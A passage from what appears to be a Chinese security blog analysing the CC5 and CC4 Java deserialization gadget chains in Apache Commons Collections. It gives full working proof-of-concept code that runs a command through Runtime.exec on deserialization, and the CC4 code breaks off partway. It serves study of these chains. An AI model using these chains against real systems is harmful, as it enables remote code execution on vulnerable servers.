&lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>在idea访问<code>Commons Collections</code>组件的文件时候点击上方的下载源代码就可以看到对应文件的.java文件了</p><h1 id="0x03、分析"><a href="#0x03、分析" class="headerlink" title="0x03、分析"></a>0x03、分析</h1><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>CC5链基于CC1-LazyMap链进行的变式延伸，回顾CC1-LazyMap链：<br>CC1（LazyMap链）：</p><ul><li>生成LazyMap对象，将<code>InvokerTransformer</code>利用方法串起来的<code>ChainedTransformer</code>对象传入<code>LazyMap</code>构造方法，随后将LazyMap对象传入<code>AnnotationInvocationHandler</code>代理类。</li><li>通过动态代理，在生成二次代理对象时调用对象的<code>invoke</code>方法，其中<code>invoke</code>方法中调用<code>LazyMap.get()</code>方法、<code>get()</code>方法调用<code>ChainedTransformer.transform()</code>方法最后实现<code>InvokerTransformer.transform()</code>执行命令;</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>CC5在基于CC1-LazyMap链上引入了<code>TiedMapEntry</code>类和<code>BadAttributeValueExpException</code>类，其中<code>TiedMapEntry</code>类为<code>commons.collections</code>组件类，<code>BadAttributeValueExpException</code>类为jdk内置类。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br></pre></td></tr></table></figure><h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p>回到LazyMap链的调用，在<code>get</code>方法中，判断map对象中的Key是否存在传入的key，不存在就新建一个value值去put入map对象中，其中便调用了<code>factory.transform(key)</code></p><p><img src="/posts/340e4601/cc5-1.png" title="LazyMap.get()"></p><p>其中<code>factory</code>为构造方法传入赋值的，因此构造参数传入<code>ChainedTransformer</code>类对象，变可执行<code>ChainedTransformer.transform(key)</code>方法执行代码</p><p><img src="/posts/340e4601/cc5-2.png" title="LazyMap构造方法"></p><p>由于构造方法是保护限制，但存在decorate方法去返回实例化LazyMap对象并调用构造方法</p><p><img src="/posts/340e4601/cc5-3.png" title="decorate方法"></p><p>利用点知道了，LazyMap链就是通过动态代理最后去调用到get方法。</p><h3 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h3><p>接下来就是找还有哪些类可以作为利用链调用的，就延伸出来<code>TiedMapEntry</code>类</p><p><img src="/posts/340e4601/cc5-4.png" title="get方法"></p><p>其中map对象是由构造方法传入的Map类型的对象</p><p><img src="/posts/340e4601/cc5-5.png" title="构造方法"></p><p>接下来就找在哪调用了<code>getValue()</code>方法</p><p><img src="/posts/340e4601/cc5-6.png" title="调用情况"></p><p>其中在本类有3个方法进行了调用<br><code>equals()</code>、<code>hashCode()</code>、<code>toString()</code></p><p>还需要一个序列化入口去调用其中的方法。</p><h3 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h3><p>这时延伸出<code>BadAttributeValueExpException</code>类，<code>BadAttributeValueExpException</code>类为<code>Exception</code>类的子类，实现了序列化，并重写了<code>readObject</code>反序列化方法</p><p><img src="/posts/340e4601/cc5-7.png" title="调用情况"></p><p>相关注释：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">//读取序列化字段</span></span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">        <span class="comment">//获取序列化val字段的值</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//判断该值是否为null</span></span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">            val = <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">//不为null的话再判断该值是否是String类型</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        <span class="comment">//不为空且不为String类型的话，再判断当前系统安全管理器是否存在，默认不存在返回null，或者判断值是否为其他类型中一种</span></span><br><span class="line">        <span class="comment">//代码意思为如果val的值不是String类型的话就给他.toString()转化为字符串类型</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            <span class="comment">//执行toString()</span></span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>因此为了执行<code>TiedMapEntry.toString()</code>方法，需要传入<code>val</code>字段值为<code>TiedMapEntry</code>对象，因为当前系统安全管理器默认不存在返回<code>null</code>，因此会执行<code>valObj.toString()</code>达到代码执行的目的</p><p>接下来只需要向<code>val</code>字段传入<code>TiedMapEntry</code>对象作为值即可，这里有<code>BadAttributeValueExpException</code>构造方法对val进行赋值</p><p><img src="/posts/340e4601/cc5-8.png" title="构造方法"></p><p>这里判断<code>val</code>是否为<code>null</code>,如果不为<code>null</code>，则直接执行<code>val.toString()</code></p><p>由于该构造方法直接调用时，便会执行<code>val.toString()</code>，因此在编写poc生成序列化的时候，便会在本地触发<code>val.toString()</code>造成代码执行。</p><p><img src="/posts/340e4601/cc5-9.png" title="本地执行"></p><p>同时在反序列化时发现并不会触发漏洞，断点查看val值已经变成进程对象</p><p><img src="/posts/340e4601/cc5-10.png" title="val"></p><p>因为在序列化过程前，代码执行到<code>BadAttributeValueExpException</code>调用构造方法触发代码后，<code>val</code>的值已经被运行完后赋值，返回<code>getKey() + &quot;=&quot; + getValue()</code>即上图中的值，此时的val值不再是<code>TiedMapEntry</code>对象，因此无法反序列化触发漏洞</p><p><img src="/posts/340e4601/cc5-11.png" title="val"></p><p>可通过反射对val值进行赋值成<code>TiedMapEntry</code>对象，可规避这个问题，至此，利用链完成。</p><h2 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h2><p>首先CC1-LazyMap链的前半段没有变化（也就是ChainedTransformer触发点），可直接使用</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="comment">//获取Runtime类对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>接着创建Map对象，通过调用decorate方法实例化LazyMap对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChain);</span><br></pre></td></tr></table></figure><p>然后<code>TiedMapEntry</code>对象，为了通过<code>toString()</code>调用<code>getValue()</code>方法中的<code>map.get()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//传入LazyMap对象，key随便设置例如下11</span></span><br><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br></pre></td></tr></table></figure><p>最后通过<code>BadAttributeValueExpException</code>类调用<code>TiedMapEntry.toString()</code>方法，并通过反射设置<code>val</code>值为TiedMapEntry对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException BV=<span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">111</span>);</span><br><span class="line">Field field=BV.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(BV,Lmap);</span><br></pre></td></tr></table></figure><p>最后序列化，反序列化触发代码执行。</p><p>完整POC:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">        BadAttributeValueExpException BV=<span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">111</span>);</span><br><span class="line">        <span class="comment">//通过反射设置val值为TiedMapEntry对象</span></span><br><span class="line">        Field field=BV.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(BV,TM);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc5payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(BV);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc5payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>实现demo：</p><p><img src="/posts/340e4601/cc5-12.png" title="实现demo"></p><h1 id="0x04、总结"><a href="#0x04、总结" class="headerlink" title="0x04、总结"></a>0x04、总结</h1><p>CC5在CC1-LazyMap链后半段通过BadAttributeValueExpException类调用TiedMapEntry.toString()方法达到执行效果，相对调用比较简单，但反向思维通过LazyMap跳到TiedMapEntry类去调用确实很难逆向去想到，调用类实在太多了，只有通过查看POC进行正向分析。</p><h1 id="0x05、参考链接"><a href="#0x05、参考链接" class="headerlink" title="0x05、参考链接"></a>0x05、参考链接</h1><p><a href="https://paper.seebug.org/1242/">https://paper.seebug.org/1242/</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-CC4链学习与分析</title>
      <link href="/posts/e3ecc659.html"/>
      <url>/posts/e3ecc659.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>CC1、2、3过完，4也是变种，还是单独列出来方便整理吧，写一起太乱了。</p><h1 id="0x01、Apache-Commons-Collections描述"><a href="#0x01、Apache-Commons-Collections描述" class="headerlink" title="0x01、Apache Commons Collections描述"></a>0x01、Apache Commons Collections描述</h1><p>引用CC1链分析中的描述<br>CC链即Commons Collections利用链，主要针对Commons Collections组件发现的利用链。</p><blockquote><p>Apache Commons是Apache软件基金会的项目。Commons的目的是提供可重用的、开源的Java代码。<br>Apache Commons提供了很多工具类库，他们几乎不依赖其他第三方的类库，接口稳定，集成简单，可以大大提高编码效率和代码质量。<br>Apache Commons Collections 是对 java.util.Collection 的扩展。<br>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p></blockquote><p>目前 Collections 包有两个 commons-collections 和commons-collections4，commons-collections 最新版本是3.2.2，3系列版本也是只有3.2.2是安全的，不支持泛型，目前官方已不在维护。collections4 目前最新版本是4.4，其中4.0是存在漏洞，最低要求 Java8 以上。相对于 collections 来说完全支持 Java8 的特性并且支持泛型，该版本无法兼容旧有版本，于是为了避免冲突改名为 collections4。推荐直接使用该版本。（注：两个版本可以共存，使用时需要注意）</p><h1 id="0x02、环境准备"><a href="#0x02、环境准备" class="headerlink" title="0x02、环境准备"></a>0x02、环境准备</h1><p>java版本：jdk8u66（版本无限制）<br>Commons Collections：4.0（漏洞版本在4.0）<br>maven项目pom.xml文件中添加依赖</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>在idea访问<code>Commons Collections</code>组件的文件时候点击上方的下载源代码就可以看到对应文件的.java文件了</p><h1 id="0x03、分析"><a href="#0x03、分析" class="headerlink" title="0x03、分析"></a>0x03、分析</h1><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>在学cc2的时候，使用到了两条链：</p><ul><li><font color="red">ChainedTransformer(Runtime)</font>+<font color="red">PriorityQueue</font>：通过ChainedTransformer串联Runtime恶意方法，添加到PriorityQueue队列比较器中，在添加元素时触发利用。</li><li><font color="red">字节码</font>+<font color="red">PriorityQueue</font>：通过invokerTransformer调用templates.newTransformer()方法，并作为比较器添加到PriorityQueue队列中，添加templates对象作为元素时，比较时调用templates.newTransformer()方法触发利用。</li></ul><p>在cc3链中学习时，使用的两个链：</p><ul><li>通过<font color="red">字节码</font>+<font color="red">(TrAXFilter+InstantiateTransformer)</font>+<font color="red">LazyMap</font>：通过LazyMap调用invoke方法执行到ChainedTransformer中的(TrAXFilter+InstantiateTransformer)，实例化TrAXFilter对象，并执行templates.newTransformer()方法触发利用。</li><li>通过<font color="red">字节码</font>+<font color="red">(TrAXFilter+InstantiateTransformer)</font>+<font color="red">TransformedMap</font>：通过TransformedMap重写的反序列化调用ChainedTransformer中的(TrAXFilter+InstantiateTransformer)，实例化TrAXFilter对象，并执行templates.newTransformer()方法触发利用。</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>序列化利用链触发方法简单形容就是：恶意代码构造+触发点+序列化入口</p><p>而cc4中把cc2、cc3中可组合利用的部分链进行了组合。</p><p>cc4中利用版本为Commons Collections4，意味着cc2中的PriorityQueue队列仍然可以作为序列化入口（Commons Collections3中TransformingComparator未实现序列化）。</p><p><img src="/posts/e3ecc659/cc4-1.png" title="PriorityQueue队列"></p><p>PriorityQueue队列序列化入口有了，接下来就是触发点和恶意代码构造。</p><p>触发点就为cc3中的(TrAXFilter+InstantiateTransformer)，恶意代码构造为字节码。</p><p><img src="/posts/e3ecc659/cc4-2.png" title="触发点和恶意代码构造"></p><p>cc4的利用链思路就出来了，很简单，简述就是把cc3中的(TrAXFilter+InstantiateTransformer)触发方式跟cc2的第二条链的触发方式替换了一下。</p><p>由于触发点的更换，因此在PriorityQueue队列中无需添加templates对象元素。</p><p>因为在CC3中触发点为<code>invokerTransformer(&quot;newTransformer&quot;)</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过反射调用InvokerTransformer的带参构造方法，参数为执行的方法名，因此传递类型为String.class</span></span><br><span class="line">        Constructor cons=Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        <span class="comment">//突破限制，强制调用</span></span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//生成InvokerTransformer对象,引用构造函数，参数为getOutputProperties方法名，也可以为newTransformer方法名</span></span><br><span class="line">        InvokerTransformer invokerTransformer=(InvokerTransformer) cons.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>想要调用该触发点，必须在队列首位添加templates对象的元素，才能调用InvokerTransformer.transform(TemplatesImpl)</p><p><img src="/posts/e3ecc659/cc4-3.png" title="添加元素"><br><img src="/posts/e3ecc659/cc4-4.png" title="compare"></p><p>而在cc4中，触发点变成了(TrAXFilter+InstantiateTransformer)作为比较器，目的只需要调用到该比较器即可触发利用，因此无需向队列添加元素，Transformer[]首位为ConstantTransformer对象，传入的任何obj对象都会返回TrAXFilter.class，因此对Obj传入参数并不影响。</p><p><img src="/posts/e3ecc659/cc4-5.png" title="compare"></p><h2 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h2><p>可以继续按照 恶意代码构造+触发点+序列化入口<br>恶意代码构造依旧把cc2主体代码（字节码）搬过来</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建CtClass对象容器</span></span><br><span class="line">ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"><span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line"><span class="comment">//创建新类Exp2</span></span><br><span class="line">CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line"><span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line"><span class="comment">//创建构造函数</span></span><br><span class="line">CtConstructor cons2=ct.makeClassInitializer();</span><br><span class="line"><span class="comment">//向构造函数插入字节码</span></span><br><span class="line">cons2.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line"><span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line"><span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line"><span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line"><span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line"><span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line"><span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br></pre></td></tr></table></figure><p>接着触发点，使用cc3中的触发点</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//串联TrAXFilter类和InstantiateTransformer类。</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="comment">//获取TrAXFilter类对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="comment">//调用InstantiateTransformer方法，实例化TrAXFilter对象，并执行TransformerImpl.newTransformer()方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>最后添加PriorityQueue序列化入口，并通过反射设置满足条件，再根据上述分析，去掉添加元素的步骤</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//设置比较器，目的调用compare方法去执行invokerTransformer.transform(),执行getOutputProperties方法</span></span><br><span class="line">TransformingComparator comparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"><span class="comment">//设置优先级队列对象</span></span><br><span class="line">PriorityQueue pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line"><span class="comment">//设置size大小，满足大于2的条件</span></span><br><span class="line">setFieldValue(pq,<span class="string">&quot;size&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="comment">//设置比较器</span></span><br><span class="line">setFieldValue(pq,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br></pre></td></tr></table></figure><p>最后反序列化</p><p>得到最后代码poc：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons2=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons2.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//串联TrAXFilter类和InstantiateTransformer类。</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取TrAXFilter类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="comment">//调用InstantiateTransformer方法，实例化TrAXFilter对象，并执行TransformerImpl.newTransformer()方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title 